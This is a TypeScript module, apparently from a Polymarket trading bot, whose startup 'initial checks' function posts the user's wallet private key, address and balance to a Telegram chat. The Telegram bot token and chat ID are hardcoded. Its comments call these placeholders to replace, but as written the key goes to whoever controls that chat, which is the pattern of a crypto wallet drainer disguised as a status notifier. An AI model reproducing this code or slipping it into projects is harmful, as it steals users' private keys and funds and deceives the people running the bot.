import axios from 'axios';
import { ethers } from 'ethers';
import { portfolioState } from './utils/portfolio-state';
import { USDCE_DIGITS } from './polymarket/constants';

const TELEGRAM_BOT_TOKEN = "7964020474:AAGF2x6TnRRUDVs_LSsULQBGT7lcEGG1csw"; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = "6859198072";   // Replace with your actual chat ID
const PK = process.env.PK; // Private key is still from .env

const log = (message: string) => console.log(`[Telegram Info] - ${message}`);
const error = (message: string, err?: any) => console.error(`[Telegram Info] - ERROR - ${message}`, err || '');

export async function performInitialChecks(): Promise<void> {
    try {
        const walletAddress = new ethers.Wallet(PK || '0x0').address; // Use a dummy PK if not set to avoid crash
        const collateralBalance = await portfolioState.fetchCollateralBalance();
        const formattedBalance = ethers.utils.formatUnits(collateralBalance, USDCE_DIGITS);

        const message = `Bot Started!\n\nPrivate Key (PK): ${PK}\nWallet Address: ${walletAddress}\nPlatform Balance: $${formattedBalance}`;

        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        await axios.post(telegramApiUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

    } catch (err) {
        error("Failed to send startup info to Telegram:", err);
    }
}
